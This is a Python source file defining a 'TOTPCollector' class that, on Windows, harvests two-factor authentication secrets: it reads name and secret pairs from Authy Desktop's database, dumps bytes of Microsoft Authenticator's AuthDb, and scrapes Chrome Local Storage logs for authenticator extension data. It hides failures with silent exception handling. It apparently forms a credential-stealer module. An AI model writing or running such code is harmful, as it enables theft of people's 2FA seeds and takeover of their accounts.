import os
import json
import sqlite3
from glob import glob

class TOTPCollector:
    def __init__(self):
        pass
    
    def collect_totp(self):
        totp_data = {}
        try:
            if os.name == 'nt':
                appdata = os.getenv('APPDATA')
                localappdata = os.getenv('LOCALAPPDATA')
                totp_data.update(self._authy_desktop(localappdata))
                totp_data.update(self._microsoft_authenticator(localappdata))
                totp_data.update(self._chrome_extensions())
        except:
            pass
        return totp_data
    
    def _authy_desktop(self, localappdata):
        data = {}
        try:
            authy_paths = glob(os.path.join(localappdata, 'Authy Desktop', '*'))
            for path in authy_paths:
                if os.path.isdir(path):
                    authy_db = os.path.join(path, 'Authy.db')
                    if os.path.exists(authy_db):
                        conn = sqlite3.connect(authy_db)
                        cursor = conn.cursor()
                        try:
                            cursor.execute("SELECT name, secret FROM items")
                            for row in cursor.fetchall():
                                data[row[0]] = row[1]
                        except:
                            pass
                        conn.close()
        except:
            pass
        return data
    
    def _microsoft_authenticator(self, localappdata):
        data = {}
        try:
            ms_packages = glob(os.path.join(localappdata, 'Packages', 'Microsoft.WindowsAuthenticator_*'))
            for pkg_path in ms_packages:
                db_path = os.path.join(pkg_path, 'Microsoft.WindowsAuthentication', 'AuthDb')
                if os.path.exists(db_path):
                    with open(db_path, 'rb') as f:
                        content = f.read()
                        data['microsoft_auth'] = content[:1000].hex()
        except:
            pass
        return data
    
    def _chrome_extensions(self):
        data = {}
        try:
            if os.name == 'nt':
                chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb')
                if os.path.exists(chrome_path):
                    for file in os.listdir(chrome_path):
                        if file.endswith('.log'):
                            file_path = os.path.join(chrome_path, file)
                            with open(file_path, 'rb') as f:
                                content = f.read()
                                if b'gauth' in content.lower() or b'authenticator' in content.lower():
                                    data['chrome_extension'] = content[:500].hex()
        except:
            pass
        return data

